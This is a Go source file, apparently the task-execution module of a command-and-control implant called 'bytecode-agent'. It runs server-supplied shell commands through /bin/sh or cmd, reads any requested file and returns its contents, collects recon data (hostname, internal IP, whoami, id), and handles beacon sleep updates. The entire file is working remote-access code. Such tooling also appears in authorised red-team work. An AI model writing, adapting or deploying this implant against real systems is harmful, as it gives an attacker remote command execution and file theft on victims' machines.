package executor

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"bytecode-agent/internal/comms"
	"bytecode-agent/internal/identity"
)

// MaxOutputSize limits the output size sent back to the server
const MaxOutputSize = 64 * 1024 // 64KB

// Execute handles task execution based on type
func Execute(task *comms.TaskPayload) *comms.ResultRequest {
	result := &comms.ResultRequest{
		TaskID: task.ID,
		Status: "success",
	}

	switch task.Type {
	case "system_info":
		result.Output = collectSystemInfo()
	case "execute_command":
		output, err := executeCommand(task.Payload)
		if err != nil {
			result.Output = output
			result.Error = err.Error()
			result.Status = "error"
		} else {
			result.Output = output
		}
	case "upload_result":
		output, err := readFile(task.Payload)
		if err != nil {
			result.Error = err.Error()
			result.Status = "error"
		} else {
			result.Output = output
		}
	case "sleep_update":
		// Handled in beacon loop, just acknowledge
		result.Output = "sleep interval updated"
	default:
		result.Error = fmt.Sprintf("unknown task type: %s", task.Type)
		result.Status = "error"
	}

	// Truncate output if too large
	if len(result.Output) > MaxOutputSize {
		result.Output = result.Output[:MaxOutputSize] + "\n... [output truncated]"
	}

	return result
}

// collectSystemInfo gathers system metadata
func collectSystemInfo() string {
	info := identity.GetSystemInfo()

	data := map[string]interface{}{
		"hostname":    info.Hostname,
		"os":          info.OS,
		"arch":        info.Arch,
		"pid":         info.PID,
		"internal_ip": info.InternalIP,
		"go_version":  runtime.Version(),
		"num_cpu":     runtime.NumCPU(),
		"num_goroutine": runtime.NumGoroutine(),
		"timestamp":   time.Now().UTC().Format(time.RFC3339),
	}

	// Try to get additional system info
	if runtime.GOOS == "linux" {
		if out, err := exec.Command("uname", "-a").Output(); err == nil {
			data["uname"] = strings.TrimSpace(string(out))
		}
		if out, err := exec.Command("whoami").Output(); err == nil {
			data["user"] = strings.TrimSpace(string(out))
		}
		if out, err := exec.Command("id").Output(); err == nil {
			data["id"] = strings.TrimSpace(string(out))
		}
	} else if runtime.GOOS == "windows" {
		if out, err := exec.Command("whoami").Output(); err == nil {
			data["user"] = strings.TrimSpace(string(out))
		}
	}

	jsonBytes, _ := json.MarshalIndent(data, "", "  ")
	return string(jsonBytes)
}

// executeCommand runs a shell command and returns output
func executeCommand(payload interface{}) (string, error) {
	// Parse the command from payload
	payloadMap, ok := toMap(payload)
	if !ok {
		return "", fmt.Errorf("invalid payload: expected object with 'command' field")
	}

	cmdStr, ok := payloadMap["command"].(string)
	if !ok || cmdStr == "" {
		return "", fmt.Errorf("missing or empty 'command' in payload")
	}

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", cmdStr)
	} else {
		cmd = exec.Command("/bin/sh", "-c", cmdStr)
	}

	// Set timeout
	done := make(chan error, 1)
	var output []byte

	go func() {
		var err error
		output, err = cmd.CombinedOutput()
		done <- err
	}()

	select {
	case err := <-done:
		if err != nil {
			return string(output), fmt.Errorf("command failed: %w", err)
		}
		return string(output), nil
	case <-time.After(120 * time.Second):
		if cmd.Process != nil {
			cmd.Process.Kill()
		}
		return "", fmt.Errorf("command timed out after 120 seconds")
	}
}

// readFile reads a file and returns its contents
func readFile(payload interface{}) (string, error) {
	payloadMap, ok := toMap(payload)
	if !ok {
		return "", fmt.Errorf("invalid payload: expected object with 'path' field")
	}

	path, ok := payloadMap["path"].(string)
	if !ok || path == "" {
		return "", fmt.Errorf("missing or empty 'path' in payload")
	}

	data, err := os.ReadFile(path)
	if err != nil {
		return "", fmt.Errorf("failed to read file: %w", err)
	}

	return string(data), nil
}

// toMap converts an interface{} to map[string]interface{}
func toMap(v interface{}) (map[string]interface{}, bool) {
	switch val := v.(type) {
	case map[string]interface{}:
		return val, true
	case string:
		var m map[string]interface{}
		if err := json.Unmarshal([]byte(val), &m); err == nil {
			return m, true
		}
	}
	return nil, false
}
